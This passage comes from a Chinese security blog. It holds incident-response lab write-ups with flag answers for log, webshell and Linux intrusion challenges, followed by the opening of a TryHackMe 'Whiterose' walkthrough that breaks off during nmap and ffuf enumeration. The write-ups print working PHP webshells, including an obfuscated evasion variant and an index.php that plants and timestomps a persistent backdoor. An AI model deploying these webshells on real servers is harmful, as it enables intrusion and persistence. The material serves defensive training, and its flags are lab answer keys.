src="https://img.dkdun.cn/v1/2025/12/ef2709c7e4dc3737.png"></p><p>可以发现有 6 个用户：test1、test2、test3、root、user、hello</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">flag&#123;<span class="hljs-keyword">user</span>,hello,root,test3,test2,test1&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>前面 Q2 已经查找到了 IP <code>192.168.200.2</code> 是登陆成功了的，所以这里看 192.168.200.2 的次数就正确</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dbca134151e16bd1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>题目说新建了一个用户，查找 <code>new user</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/86b14ffe43a8a247.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;test2&#125;</span><br></code></pre></td></tr></table></figure><h1 id="webshell-查杀"><a href="#webshell-查杀" class="headerlink" title="webshell 查杀"></a>webshell 查杀</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs q">靶机账号密码 root xjwebshell<br><span class="hljs-number">1.</span>黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br><span class="hljs-number">2.</span>黑客使用的什么工具的shell github地址的<span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125;<br><span class="hljs-number">3.</span>黑客隐藏shell的完整路径的<span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx<br><span class="hljs-number">4.</span>黑客免杀马完整路径 <span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h2><p>一般来说网页文件一般在 <code>/var/www/html</code> 路径下，可以进入目录查找，<code>php</code> 文件查找危险函数 <code>eval()</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:/var/www/html# find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>./include/gz.php:               <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./include/Db/.Mysqli.php:               <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./shell.php:&lt;?php phpinfo();@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>查看 gz.php 内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/aaf79b903e9214fd.png"></p><p>拿到 flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">027ccd04</span>-<span class="hljs-number">5065</span>-<span class="hljs-number">48b6</span>-a32d-77c704a5e26d&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h2><p>可以看到 webshell 内容中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-comment">//创建或者重启一个会话</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//设置程序最长运行时间：永久</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// 关闭错误报告</span><br></code></pre></td></tr></table></figure><p>这是哥斯拉生成的 webshell 特征，哥斯拉项目地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">39392</span>de3218c333f794befef07ac9257&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h2><p>寻找隐藏 shell，在 Q1 中有危险函数的还有其他文件，访问目录查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./include/Db/.Mysqli.php<br></code></pre></td></tr></table></figure><p>对路径 <code>/var/www/html/include/Db/.Mysqli.php</code> 进行 md5 加密</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ip</span><span class="hljs-number">-10</span><span class="hljs-number">-0</span><span class="hljs-number">-10</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/html/include/Db</span><span class="hljs-comment"># echo -n &quot;/var/www/html/include/Db/.Mysqli.php&quot; |md5sum |cut -d &quot; &quot; -f1</span><br>aebac0e58cd6c5fad1695ee4d1ac1919<br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h2><p>免杀马通过静态检测是检测不到的，因为在免杀的过程中将 webshell 的特征值以及特征函数都给去掉了，但是 webshell 执行会在网站日志留下记录，所以可以到日志里面看有无可疑记录</p><p>目录下有 <code>apache2</code> 日志记录，然后查看其目录下的 <code>access.log</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/133ef6fc18302b15.png"></p><p>可以看到 <code>/wap</code> 下的 top.php 文件执行了两次 <code>phpinfo()</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/f9ff2a9d776dfeed.png"></p><p>查看 top.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br></code></pre></td></tr></table></figure><p>是免杀马了，md5 加密<code>/var/www/html/wap/top.php</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">账号：root 密码：linuxruqin<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1.</span>web目录存在木马，请找到木马的密码提交<br><span class="hljs-number">2</span>.服务器疑似存在不死马，请找到不死马的密码提交<br><span class="hljs-number">3</span>.不死马是通过哪个文件生成的，请提交文件名<br><span class="hljs-number">4</span>.黑客留下了木马文件，请找出黑客的服务器<span class="hljs-built_in">ip</span>提交<br><span class="hljs-number">5</span>.黑客留下了木马文件，请找出黑客服务器开启的监端口提交<br></code></pre></td></tr></table></figure><h2 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h2><p>进入 web 目录查找</p><p><img src="https://img.dkdun.cn/v1/2025/12/bea3ad8f80ca3f88.png"></p><p>一般来说 php 文件比较可疑，查看 <code>1.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h2><p>过滤 php 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:/var/www/html# find ./ -name <span class="hljs-string">&quot;*php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>./.shell.php:&lt;?php <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>])==<span class="hljs-string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;?&gt;<br>./index.php:<span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br>./1.php:&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>md5 解密</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hello&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h2><p>因为前面显示 <code>index.php</code> 文件中也有木马密码，所以查看一下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>能看见通过这个文件生成了不死马</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag&#123;<span class="hljs-keyword">index</span>.php&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h2><p>在 web 目录下是有一个可疑的  <code>&#39;shell(1).elf&#39;</code> 文件，赋予权限然后运行</p><p><img src="https://img.dkdun.cn/v1/2025/12/83dad8b4b4fba1d9.png"></p><p>虽然没有回显，但是可以再开一个终端，然后查找连接情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antpl<br><br><span class="hljs-comment"># -a：显示所有连接中的端口，包括监听和非监听。</span><br><span class="hljs-comment"># -n：以数字形式显示地址和端口号，而不是将其解析为主机名或服务名。</span><br><span class="hljs-comment"># -t：显示 TCP 连接。</span><br><span class="hljs-comment"># -p：显示使用每个套接字的程序。</span><br><span class="hljs-comment"># -l：显示监听状态的套接字。</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8aa72b85206e3564.png"></p><p>找到 IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">10.11.55.21</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5-1"><a href="#Q5-1" class="headerlink" title="Q5"></a>Q5</h2><p>同样找到端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3333</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>玄机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Whiterose</title>
    <link href="/2025/03/19/THM-Whiterose/"/>
    <url>/2025/03/19/THM-Whiterose/</url>
    
    <content type="html"><![CDATA[<p>烂尾了。。。</p><span id="more"></span><h1 id="What’s-Tyrell-Wellick’s-phone-number"><a href="#What’s-Tyrell-Wellick’s-phone-number" class="headerlink" title="What’s Tyrell Wellick’s phone number?"></a>What’s Tyrell Wellick’s phone number?</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# nmap -sS -sV -Pn -A <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">39</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">7</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br>| ssh-hostkey:<br>|   <span class="hljs-number">2048</span> b9:<span class="hljs-number">07</span>:<span class="hljs-number">96</span>:<span class="hljs-number">0</span>d:c4:b6:<span class="hljs-number">0</span>c:d6:<span class="hljs-number">22</span>:<span class="hljs-number">1</span>a:e4:<span class="hljs-number">6</span>c:<span class="hljs-number">8</span>e:ac:<span class="hljs-number">6</span>f:<span class="hljs-number">7</span>d (RSA)<br>|   <span class="hljs-number">256</span> ba:ff:<span class="hljs-number">92</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">0</span>f:<span class="hljs-number">03</span>:<span class="hljs-number">7</span>e:da:<span class="hljs-number">30</span>:ca:e3:<span class="hljs-number">52</span>:<span class="hljs-number">8</span>d:<span class="hljs-number">47</span>:d9:<span class="hljs-number">6</span>c (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">5</span>d:e4:<span class="hljs-number">14</span>:<span class="hljs-number">39</span>:ca:<span class="hljs-number">06</span>:<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">93</span>:<span class="hljs-number">53</span>:<span class="hljs-number">86</span>:de:<span class="hljs-number">2</span>b:<span class="hljs-number">77</span>:<span class="hljs-number">09</span>:<span class="hljs-number">7</span>d (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-server-header: nginx/<span class="hljs-number">1</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-<span class="hljs-built_in">title</span>: Site doesn&#x27;t have a <span class="hljs-built_in">title</span> (text/html).<br>Aggressive OS guesses: Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">91</span>%), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> - <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> - <span class="hljs-number">4</span>.<span class="hljs-number">9</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">7</span> - <span class="hljs-number">3</span>.<span class="hljs-number">10</span> (<span class="hljs-number">90</span>%), Linux <span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">5</span>.<span class="hljs-number">5</span> (<span class="hljs-number">90</span>%), QNAP QTS <span class="hljs-number">4</span>.<span class="hljs-number">0</span> - <span class="hljs-number">4</span>.<span class="hljs-number">2</span> (<span class="hljs-number">90</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3</span>.<span class="hljs-number">4</span>) (<span class="hljs-number">89</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">3</span> hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port <span class="hljs-number">8888</span>/tcp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0</span>.<span class="hljs-number">34</span> ms   <span class="hljs-number">172</span>.<span class="hljs-number">30</span>.<span class="hljs-number">144</span>.<span class="hljs-number">1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">389</span>.<span class="hljs-number">62</span> ms <span class="hljs-number">10</span>.<span class="hljs-number">21</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-number">3</span>   <span class="hljs-number">390</span>.<span class="hljs-number">09</span> ms <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">218</span>.<span class="hljs-number">118</span><br><br>OS and Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">45</span>.<span class="hljs-number">53</span> seconds<br></code></pre></td></tr></table></figure><p>开放了 80，22</p><p>访问 web 网页，啥也没有</p><p><img src="https://img.dkdun.cn/v1/2025/12/faf3fe0510f50508.png"></p><p>利用 fuff 测一下有没有子域名</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt -u http://cyprusbank.thm/ -H &quot;Host:FUZZ.cyprusbank.thm&quot; -fw <span class="hljs-number">1</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://cyprusbank.thm/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt<br> :: Header           : Host: FUZZ.cyprusbank.thm<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response words: <span class="hljs-number">1</span><br>________________________________________________<br><br>www                     [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">252</span>, Words: <span class="hljs-number">19</span>, Lines: <span class="hljs-number">9</span>, Duration: <span class="hljs-number">447</span>ms]<br>admin                   [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">28</span>, Words: <span class="hljs-number">4</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">447</span>ms]<br>:: Progress: [<span class="hljs-number">4989</span>/<span class="hljs-number">4989</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">89</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">56</span>] :: Errors: <span class="hljs-number">0</span> :<br></code></pre></td></tr></table></figure><p>有两个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.cyprusbank</span><span class="hljs-selector-class">.thm</span><br>admin<span class="hljs-selector-class">.cyprusbank</span>.thm<br></code></pre></td></tr></table></figure><p>在 <code>admin.cyprusbank.thm</code> 站点上有一个登录页面，用给出的用户密码登录进去</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Olivia</span> <span class="hljs-title 